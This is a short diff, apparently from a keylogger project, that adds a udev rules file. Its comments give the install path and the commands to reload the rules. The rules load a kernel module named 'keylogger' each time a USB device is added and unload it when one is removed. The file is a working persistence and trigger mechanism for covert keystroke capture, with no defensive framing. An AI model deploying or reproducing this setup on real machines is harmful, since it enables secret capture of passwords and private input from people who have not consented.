@@ -1,0 +1,6 @@
+# put to  /etc/udev/rules.d/
+# udevadm control --reload-rules && sudo udevadm trigger
+# the module should be in /lib/modules/$(uname -r)/
+
+ACTION=="add", SUBSYSTEM=="usb", PROGRAM="/usr/sbin/modprobe keylogger"
+ACTION=="remove", SUBSYSTEM=="usb", PROGRAM="/usr/sbin/rmmod keylogger"
